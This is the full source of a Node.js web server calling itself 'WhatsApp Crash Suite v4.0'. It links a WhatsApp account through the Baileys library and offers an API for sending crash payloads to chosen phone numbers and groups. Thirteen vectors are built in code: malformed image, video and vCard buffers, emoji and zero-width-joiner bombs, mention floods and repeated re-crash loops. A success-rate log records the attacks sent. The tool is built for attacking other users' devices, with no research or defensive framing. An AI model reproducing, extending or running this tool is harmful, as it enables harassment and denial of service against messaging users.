'use strict';

// ── MUST BE FIRST: crypto polyfill for Node.js 18 (Baileys signal protocol needs it) ──
if (!globalThis.crypto) {
    const { webcrypto } = require('crypto');
    globalThis.crypto = webcrypto;
}

const express  = require('express');
const path     = require('path');
const http     = require('http');
const fs       = require('fs');
const socketIo = require('socket.io');
const pino     = require('pino');
const {
    makeWASocket,
    DisconnectReason,
    fetchLatestBaileysVersion,
    Browsers,
    useMultiFileAuthState
} = require('@whiskeysockets/baileys');

const app    = express();
const server = http.createServer(app);
const io     = socketIo(server, {
    cors: { origin: '*', methods: ['GET', 'POST'] },
    path: '/socket.io',
    transports: ['websocket', 'polling'],
    // ── Heroku kills idle connections after 55s — keep ping well under that ──
    pingTimeout: 20000,
    pingInterval: 10000,
    upgradeTimeout: 10000,
    allowUpgrades: true
});

const PORT     = process.env.PORT || 8080;
const AUTH_DIR = 'auth_info_baileys';
const NUMBERS_FILE = 'paired_numbers.json';

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============================================================
// 📂 JSON FILE HELPERS (replaces MongoDB)
// ============================================================

function readNumbers() {
    try {
        if (fs.existsSync(NUMBERS_FILE)) {
            return JSON.parse(fs.readFileSync(NUMBERS_FILE, 'utf8'));
        }
    } catch (_) {}
    return [];
}

function writeNumbers(numbers) {
    try { fs.writeFileSync(NUMBERS_FILE, JSON.stringify(numbers, null, 2)); } catch (_) {}
}

function upsertNumber(number) {
    const numbers = readNumbers();
    const idx = numbers.findIndex(n => n.number === number);
    const now = new Date().toISOString();
    if (idx >= 0) {
        numbers[idx].status   = 'active';
        numbers[idx].lastSeen = now;
    } else {
        numbers.unshift({ number, status: 'active', pairedAt: now, lastSeen: now });
    }
    writeNumbers(numbers);
}

function setNumberOffline(number) {
    if (!number) return;
    const numbers = readNumbers();
    const idx = numbers.findIndex(n => n.number === number);
    if (idx >= 0) {
        numbers[idx].status   = 'offline';
        numbers[idx].lastSeen = new Date().toISOString();
        writeNumbers(numbers);
    }
}

function removeNumber(number) {
    writeNumbers(readNumbers().filter(n => n.number !== number));
}

// ============================================================
// STATE
// ============================================================

let sock               = null;
let isConnected        = false;
let isPairing          = false;
let wasConnected       = false;
let currentPairingCode = null;
let currentQR          = null;
let currentPhoneNumber = null;
let connectionStatus   = 'offline';
let pairMode           = 'qr';
const crashLogs        = [];

// ============================================================
// 🔥 WHATSAPP CONNECTION  (QR Code OR Pairing Code)
// ============================================================

async function connectToWhatsApp(phoneNumber, socketId, mode = 'qr') {
    try {
        const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
        if (cleanNumber.length < 10) throw new Error('Invalid phone number (min 10 digits)');

        if (sock) {
            try { sock.end(undefined); } catch (_) {}
            sock = null;
            isConnected = false;
            currentPairingCode = null;
            connectionStatus = 'offline';
        }

        // ── Auth state: JSON files via useMultiFileAuthState ──────────────────
        fs.mkdirSync(AUTH_DIR, { recursive: true });
        const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);

        let version;
        try {
            const vResult = await fetchLatestBaileysVersion();
            version = vResult.version;
            console.log(`✅ Baileys version: ${version.join('.')}`);
        } catch (e) {
            version = [2, 3000, 1015901307];
            console.warn(`⚠️ fetchLatestBaileysVersion failed (${e.message}), using fallback ${version.join('.')}`);
        }

        sock = makeWASocket({
            version,
            auth: state,
            logger: pino({ level: 'silent' }),
            browser: Browsers.ubuntu('Chrome'),
            mobile: false,
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 60000,
            keepAliveIntervalMs: 25000,
            retryRequestDelayMs: 250,
            markOnlineOnConnect: false,
            syncFullHistory: false,
            printQRInTerminal: false,
        });

        sock.ev.on('creds.update', saveCreds);

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;
            console.log('🔔 Connection update:', { connection, hasQR: !!qr });

            // ── QR Code (emitted by Baileys when mode='qr') ──────────────────
            if (qr) {
                currentQR = qr;
                isPairing = true;
                connectionStatus = 'qr';
                console.log('📷 QR Code generated — waiting for scan');
                io.emit('qr_code', { qr });
                io.emit('status_update', { status: 'qr' });
            }

            if (connection === 'close') {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                const loggedOut  = statusCode === DisconnectReason.loggedOut;
                const hadSession = wasConnected;
                console.log(`⚠️  Connection closed | wasConnected:${hadSession} | isPairing:${isPairing} | loggedOut:${loggedOut}`);

                isConnected        = false;
                isPairing          = false;
                wasConnected       = false;
                currentPairingCode = null;
                connectionStatus   = 'offline';
                io.emit('status_update', { status: 'disconnected' });

                setNumberOffline(currentPhoneNumber);

                // ── Only reconnect if session was fully established before drop ──
                if (!loggedOut && hadSession) {
                    console.log('🔄 Re-connecting established session in 5s...');
                    setTimeout(() => connectToWhatsApp(phoneNumber, socketId), 5000);
                } else if (!hadSession) {
                    console.log('ℹ️  Drop during pairing — not reconnecting. User must retry.');
                }
            } else if (connection === 'open') {
                console.log('✅ WhatsApp Connected!');
                isConnected        = true;
                wasConnected       = true;
                isPairing          = false;
                connectionStatus   = 'connected';
                currentPairingCode = null;
                currentPhoneNumber = phoneNumber;
                io.emit('status_update', { status: 'connected', phone: phoneNumber });
                io.emit('connected', { message: '✅ Connected!' });

                // Save number + phone file for auto-reconnect
                upsertNumber(phoneNumber);
                fs.writeFileSync(path.join(AUTH_DIR, '.phone'), phoneNumber);
                console.log(`💾 Number ${phoneNumber} saved to paired_numbers.json`);
            }
        });

        sock.ev.on('messages.upsert', async ({ messages }) => {
            const msg  = messages[0];
            if (!msg.message) return;
            const from = msg.key.remoteJid;
            const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
            if (text.includes('[CRASH-CONFIRM]')) {
                console.log('💀 CRASH CONFIRMED!');
                saveCrashLog(from, 'confirmed');
            }
        });

        // ── Pairing Code mode ONLY (QR mode uses connection.update.qr above) ─
        if (!state.creds.registered && mode === 'code') {
            isPairing        = true;
            connectionStatus = 'pairing';
            console.log(`🔑 Requesting pairing code for: ${cleanNumber}`);
            await new Promise((resolve) => {
                if (sock.ws && sock.ws.readyState === 1) { resolve(); }
                else if (sock.ws) { sock.ws.once('open', resolve); setTimeout(resolve, 8000); }
                else { setTimeout(resolve, 8000); }
            });
            await new Promise(r => setTimeout(r, 2000));
            const code = await sock.requestPairingCode(cleanNumber);
            if (!code) throw new Error('Pairing code nahi mila — dobara try karo');
            currentPairingCode = code;
            isPairing          = true;
            console.log(`📱 Pairing Code: ${code} | Number: ${cleanNumber}`);
            io.emit('pairing_code', { code });
            io.emit('status_update', { status: 'pairing', pairingCode: code });
        }

        // QR mode: Baileys will auto-emit QR via connection.update
        if (!state.creds.registered && mode === 'qr') {
            isPairing        = true;
            connectionStatus = 'qr';
            console.log(`📷 QR mode active — waiting for Baileys QR emit`);
        }

        return { success: true, pairingCode: currentPairingCode };
    } catch (error) {
        isPairing = false;
        console.error('❌ Connection error:', error.message);
        throw error;
    }
}

// ============================================================
// 📊 CRASH LOGS
// ============================================================

function saveCrashLog(target, status, vector = '', message = '') {
    crashLogs.unshift({ id: Date.now(), target, vector, status, message, time: new Date().toISOString() });
    if (crashLogs.length > 1000) crashLogs.pop();
}

// ============================================================
// 🔥 CRASH VECTORS
// ============================================================

const VECTORS = [
    { id: 'jpeg2000_oom',            name: 'JPEG2000 OOM Crash',       icon: '💀', desc: 'Malformed JPEG2000 → OOM crash',           badge: 'ZERO-CLICK', targetType: 'individual' },
    { id: 'webp_heap_overflow',      name: 'WebP Heap Overflow',        icon: '🧨', desc: 'Malformed WebP → Heap overflow',            badge: 'HEAVY',      targetType: 'individual' },
    { id: 'exif_overflow',           name: 'EXIF Overflow',             icon: '📸', desc: 'EXIF metadata → Parser crash',              badge: 'CRASH',      targetType: 'individual' },
    { id: 'contact_card_crash',      name: 'Contact Card Crash',        icon: '👤', desc: 'vCard parser → Stack overflow',             badge: 'CRASH',      targetType: 'individual' },
    { id: 'gif_crash',               name: 'GIF Parser Crash',          icon: '🎞️', desc: 'Malformed GIF → LZW overflow',             badge: 'ZERO-CLICK', targetType: 'individual' },
    { id: 'video_crash',             name: 'Video Thumbnail Crash',     icon: '🎬', desc: 'Malformed MP4 → Thumbnail crash',           badge: 'HEAVY',      targetType: 'individual' },
    { id: 'emoji_bomb',              name: 'Emoji Bomb',                icon: '😈', desc: 'ZWJ sequences → Renderer hang',            badge: 'HANG',       targetType: 'individual' },
    { id: 'protobuf_oversize',       name: 'Protobuf Oversize',         icon: '📦', desc: '2GB message → OOM crash',                  badge: 'OOM',        targetType: 'individual' },
    { id: 'silent_memory_leak',      name: 'Silent Memory Leak',        icon: '🕳️', desc: 'Background memory leak → Slow kill',       badge: 'INVISIBLE',  targetType: 'individual' },
    { id: 'group_mention_explosion', name: 'Mention Explosion',         icon: '📢', desc: 'Mass @mentions → Group hang',              badge: 'GROUP',      targetType: 'group'      },
    { id: 'group_emoji_bomb',        name: 'Group Emoji Bomb',          icon: '💣', desc: 'Mass emoji → Group renderer crash',        badge: 'GROUP',      targetType: 'group'      },
    { id: 'persistent_loop',         name: 'Persistent Crash Loop',     icon: '♻️', desc: '10× re-crash',                            badge: 'PERSIST',    targetType: 'individual' },
    { id: 'hard_delay',              name: 'Hard Delay Attack',         icon: '⏳', desc: '5-30s delayed re-crash',                  badge: 'PERSIST',    targetType: 'individual' }
];

// ============================================================
// 🧬 PAYLOAD GENERATORS
// ============================================================

function generatePayload(vectorId) {
    const payloads = {
        'jpeg2000_oom': Buffer.from([0xFF,0x4F,0xFF,0x51,0x00,0x2F,0x00,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF]),
        'webp_heap_overflow': (() => {
            let d = Buffer.concat([Buffer.from('RIFF','ascii'), Buffer.from([0xFF,0xFF,0xFF,0xFF]), Buffer.from('WEBP','ascii'), Buffer.from('VP8X','ascii'), Buffer.from([0xFF,0xFF,0xFF,0xFF]), Buffer.alloc(20,0xFF)]);
            return d;
        })(),
        'exif_overflow': (() => {
            let d = Buffer.from([0xFF,0xD8,0xFF,0xE1,0xFF,0xFF]);
            d = Buffer.concat([d, Buffer.from('EXIF','ascii'), Buffer.from('MM\x00\x2A','ascii'), Buffer.from([0x00,0x00,0x00,0x08,0xFF,0xFF])]);
            for (let i=0;i<65535;i++) d = Buffer.concat([d, Buffer.from([i%255,(i*2)%255,0x00,0x04,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF])]);
            return d;
        })(),
        'contact_card_crash': (() => {
            let v = 'BEGIN:VCARD\nVERSION:3.0\n';
            for (let i=0;i<5000;i++) v += `NESTED:${i}\nBEGIN:VCARD\nFN:Repeated\nEND:VCARD\n`;
            v += 'PHOTO;ENCODING=b:' + 'A'.repeat(100000) + '\n';
            for (let i=0;i<2000;i++) v += `TEL;TYPE=VOICE:+${String(i).padStart(15,'0')}\n`;
            v += 'END:VCARD\n';
            return Buffer.from(v);
        })(),
        'gif_crash': (() => {
            let d = Buffer.concat([Buffer.from('GIF89a','ascii'), Buffer.from([0xFF,0xFF,0xFF,0xFF,0xF7,0x00,0x00])]);
            for (let i=0;i<256;i++) d = Buffer.concat([d, Buffer.from([i%255,(i*2)%255,(i*3)%255])]);
            d = Buffer.concat([d, Buffer.from([0x21,0xF9,0x04,0x00,0xFF,0xFF,0x00,0x00,0x2C,0x00,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0x00,0x0F])]);
            for (let i=0;i<50000;i++) d = Buffer.concat([d, Buffer.from([Math.floor(Math.random()*255)])]);
            return Buffer.concat([d, Buffer.from([0x3B])]);
        })(),
        'video_crash': Buffer.concat([Buffer.from([0x00,0x00,0x00,0x18]), Buffer.from('ftypisom','ascii'), Buffer.from([0x00,0x00,0x00,0x01]), Buffer.from('isomiso2avc1','ascii'), Buffer.from([0x00,0x01,0x00,0x00]), Buffer.from('moov','ascii'), Buffer.from([0x00,0x00,0x00,0x6C]), Buffer.from('mvhd','ascii'), Buffer.alloc(24,0xFF)]),
        'emoji_bomb': (() => { let e=''; for(let i=0;i<100;i++){e+='\uD83D\uDC68\u200D\uD83D\uDC69\u200D\uD83D\uDC67'+'\uD83C\uDFFB'.repeat(100)+'\u200D'.repeat(1000)+'\uD83D\uDC6A'.repeat(100);} return Buffer.from(e); })(),
        'protobuf_oversize':  Buffer.from('A'.repeat(2*1024*1024)),
        'silent_memory_leak': Buffer.from('🕳️ ' + 'A'.repeat(1024*1024)),
        'group_mention_explosion': (() => { let t=''; for(let i=0;i<500;i++){t+=`@user${i} `;if(i%100===0&&i>0)t+='\n';} return Buffer.from(t); })(),
        'group_emoji_bomb': (() => { let e=''; for(let i=0;i<200;i++){e+='\uD83D\uDC68\u200D\uD83D\uDC69\u200D\uD83D\uDC67'+'\uD83C\uDFFB'.repeat(100)+'\u200D'.repeat(1000)+'\uD83D\uDC6A'.repeat(100)+'\n';} return Buffer.from(e); })(),
        'persistent_loop': (() => { let p=''; for(let i=0;i<50;i++) p+=`♻️ RECRASH_${i} `+'C'.repeat(10000)+'\n'; return Buffer.from(p); })(),
        'hard_delay':      (() => { let p=''; [5,10,15,20,25,30].forEach(d=>p+=`⏳ DELAY_${d}s `+'D'.repeat(10000)+'\n'); return Buffer.from(p); })()
    };
    return payloads[vectorId] || Buffer.from('[CRASH-PAYLOAD]');
}

// ============================================================
// 📡 SOCKET.IO EVENTS
// ============================================================

io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);

    socket.emit('status_update', {
        status: connectionStatus,
        connected: isConnected,
        phone: currentPhoneNumber,
        pairingCode: currentPairingCode
    });

    socket.on('pair', async (data) => {
        const { phoneNumber, mode = 'qr' } = data;
        if (!phoneNumber) { socket.emit('error', { message: 'Phone number required' }); return; }
        if (isPairing) {
            socket.emit('error', { message: 'Pairing already in progress — cancel first' });
            return;
        }
        pairMode = mode;
        try {
            if (sock) { try { sock.end(undefined); } catch (_) {} sock = null; }
            isConnected = false; wasConnected = false; isPairing = false;
            currentPairingCode = null; currentQR = null; connectionStatus = 'offline';

            // Clear stale auth so fresh pairing works
            if (fs.existsSync(AUTH_DIR)) fs.rmSync(AUTH_DIR, { recursive: true, force: true });

            await connectToWhatsApp(phoneNumber, socket.id, mode);
            socket.emit('status_update', {
                status: mode === 'qr' ? 'qr' : 'pairing',
                pairingCode: currentPairingCode
            });
        } catch (error) {
            isPairing = false;
            socket.emit('error', { message: error.message });
        }
    });

    socket.on('cancel_pair', () => {
        if (sock && !isConnected) {
            try { sock.end(undefined); } catch (_) {}
            sock = null; currentPairingCode = null; connectionStatus = 'offline';
            console.log('🚫 Pairing cancelled by client');
        }
    });

    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected:', socket.id);
    });
});

// ============================================================
// 📡 HTTP API ROUTES
// ============================================================

app.get('/api/status', (req, res) => {
    res.json({
        success: true,
        connected: isConnected,
        phoneNumber: currentPhoneNumber || null,
        pairingCode: currentPairingCode || null,
        status: connectionStatus
    });
});

app.get('/api/pairing-code', (req, res) => {
    res.json(currentPairingCode
        ? { success: true, code: currentPairingCode }
        : { success: false, message: 'No pairing code available' });
});

app.post('/api/disconnect', (req, res) => {
    try {
        if (sock) { try { sock.end(undefined); } catch (_) {} sock = null; }
        isConnected = false; currentPairingCode = null; currentPhoneNumber = null; connectionStatus = 'offline';
        io.emit('status_update', { status: 'offline' });
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ── Numbers saved in JSON file ────────────────────────────────────────────────
app.get('/api/numbers', (req, res) => {
    res.json({ success: true, numbers: readNumbers() });
});

app.delete('/api/numbers/:number', (req, res) => {
    try {
        removeNumber(req.params.number);
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ── Vectors ───────────────────────────────────────────────────────────────────
app.get('/api/vectors', (req, res) => {
    res.json({ success: true, vectors: VECTORS });
});

// ── Execute crash ─────────────────────────────────────────────────────────────
app.post('/api/crash', async (req, res) => {
    const { target, vector } = req.body;
    if (!sock || !isConnected) return res.status(400).json({ success: false, error: 'Not connected to WhatsApp' });
    if (!target)              return res.status(400).json({ success: false, error: 'Target required' });
    const vectorObj = VECTORS.find(v => v.id === vector);
    if (!vectorObj)           return res.status(400).json({ success: false, error: 'Invalid vector' });
    try {
        const jid     = target.includes('@') ? target : `${target}@s.whatsapp.net`;
        const payload = generatePayload(vector);
        let result;
        if (['jpeg2000_oom','webp_heap_overflow','exif_overflow','gif_crash','video_crash'].includes(vector)) {
            result = await sock.sendMessage(jid, { image: payload, caption: '[CRASH-CONFIRM]|' + Date.now() });
        } else if (vector === 'contact_card_crash') {
            result = await sock.sendMessage(jid, { contacts: { displayName: 'CRASH', contacts: [{ vcard: payload.toString() }] } });
        } else {
            result = await sock.sendMessage(jid, { text: payload.toString() });
        }
        saveCrashLog(jid, 'sent', vector, `💀 ${vectorObj.name} sent`);
        res.json({ success: true, messageId: result.key.id, vector, vectorName: vectorObj.name, target: jid });
    } catch (error) {
        saveCrashLog(target, 'failed', vector, error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ── Session export ────────────────────────────────────────────────────────────
app.get('/api/session', (req, res) => {
    try {
        if (!fs.existsSync(AUTH_DIR)) return res.json({ success: false, message: 'No session yet — pair first' });
        const files = fs.readdirSync(AUTH_DIR);
        if (!files.length) return res.json({ success: false, message: 'No session yet — pair first' });
        const data = {};
        for (const f of files) {
            data[f] = fs.readFileSync(path.join(AUTH_DIR, f), 'utf8');
        }
        const sessionData = Buffer.from(JSON.stringify(data)).toString('base64');
        res.json({ success: true, session: sessionData });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ── Session restore ───────────────────────────────────────────────────────────
app.post('/api/session/restore', (req, res) => {
    const { session } = req.body;
    if (!session) return res.status(400).json({ success: false, error: 'session string required' });
    try {
        const parsed = JSON.parse(Buffer.from(session, 'base64').toString('utf8'));
        if (typeof parsed !== 'object' || Array.isArray(parsed)) {
            return res.status(400).json({ success: false, error: 'Invalid session format' });
        }
        if (fs.existsSync(AUTH_DIR)) fs.rmSync(AUTH_DIR, { recursive: true, force: true });
        fs.mkdirSync(AUTH_DIR, { recursive: true });
        for (const [filename, content] of Object.entries(parsed)) {
            fs.writeFileSync(path.join(AUTH_DIR, filename), content);
        }
        console.log(`✅ Session restored via UI (${Object.keys(parsed).length} files)`);
        res.json({ success: true, message: `Session restored (${Object.keys(parsed).length} files) — click Get Pairing Code to reconnect` });
    } catch (e) {
        res.status(400).json({ success: false, error: 'Invalid session string — ' + e.message });
    }
});

// ── Logs & Metrics ────────────────────────────────────────────────────────────
app.get('/api/logs', (req, res) => {
    res.json({ success: true, logs: crashLogs.slice(0, 100) });
});

app.get('/api/metrics', (req, res) => {
    const total   = crashLogs.length;
    const success = crashLogs.filter(l => l.status === 'sent' || l.status === 'confirmed').length;
    const failed  = crashLogs.filter(l => l.status === 'failed').length;
    res.json({ success: true, metrics: { total, success, failed, successRate: total > 0 ? ((success/total)*100).toFixed(2)+'%' : '0%' } });
});

// ── Frontend ──────────────────────────────────────────────────────────────────
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================================
// 🚀 START
// ============================================================

// ── SESSION_DATA restore (Heroku restart fix) ─────────────────────────────────
function restoreSessionFromEnv() {
    const sessionData = process.env.SESSION_DATA;
    if (!sessionData) return;
    try {
        const parsed = JSON.parse(Buffer.from(sessionData, 'base64').toString('utf8'));
        if (typeof parsed === 'object' && !Array.isArray(parsed)) {
            if (!fs.existsSync(AUTH_DIR)) fs.mkdirSync(AUTH_DIR, { recursive: true });
            for (const [filename, content] of Object.entries(parsed)) {
                fs.writeFileSync(path.join(AUTH_DIR, filename), content);
            }
            console.log(`✅ Session restored from SESSION_DATA (${Object.keys(parsed).length} files)`);
        }
    } catch (e) {
        console.error('❌ Failed to restore SESSION_DATA:', e.message);
    }
}

// ── Auto-reconnect on startup (if session already exists) ─────────────────────
async function autoReconnect() {
    try {
        const phonePath = path.join(AUTH_DIR, '.phone');
        if (!fs.existsSync(phonePath)) {
            console.log('ℹ️  No .phone file found — skipping auto-reconnect');
            return;
        }
        const phoneNumber = fs.readFileSync(phonePath, 'utf8').trim();
        if (!phoneNumber) return;

        // Verify creds are registered before auto-connecting
        const credsPath = path.join(AUTH_DIR, 'creds.json');
        if (!fs.existsSync(credsPath)) {
            console.log('ℹ️  No creds.json found — skipping auto-reconnect');
            return;
        }
        const parsed = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
        if (!parsed?.registered) {
            console.log('ℹ️  Session exists but not registered — skipping auto-reconnect');
            return;
        }

        console.log(`🔄 Auto-reconnecting WhatsApp for ${phoneNumber}...`);
        connectionStatus = 'reconnecting';
        io.emit('status_update', { status: 'reconnecting', phone: phoneNumber });
        await connectToWhatsApp(phoneNumber, 'auto-reconnect');
    } catch (e) {
        console.error('❌ Auto-reconnect failed:', e.message);
        connectionStatus = 'offline';
        io.emit('status_update', { status: 'offline' });
    }
}

// ── Boot ──────────────────────────────────────────────────────────────────────
restoreSessionFromEnv();
server.listen(PORT, async () => {
    console.log(`🔥 WhatsApp Crash Suite v4.0 running on port ${PORT}`);
    console.log(`💀 ${VECTORS.length} crash vectors | Storage: JSON files (no MongoDB)`);
    setTimeout(autoReconnect, 2000);

    // ── Heroku dyno keep-alive ──
    const SELF_URL = process.env.HEROKU_APP_NAME
        ? `https://${process.env.HEROKU_APP_NAME}.herokuapp.com`
        : null;
    if (SELF_URL) {
        const _https = require('https');
        setInterval(() => {
            _https.get(`${SELF_URL}/api/status`, (res) => {
                console.log(`♻️  Keep-alive ping → ${res.statusCode}`);
                res.resume();
            }).on('error', () => {});
        }, 25 * 60 * 1000);
        console.log(`♻️  Keep-alive configured → ${SELF_URL}`);
    }
});
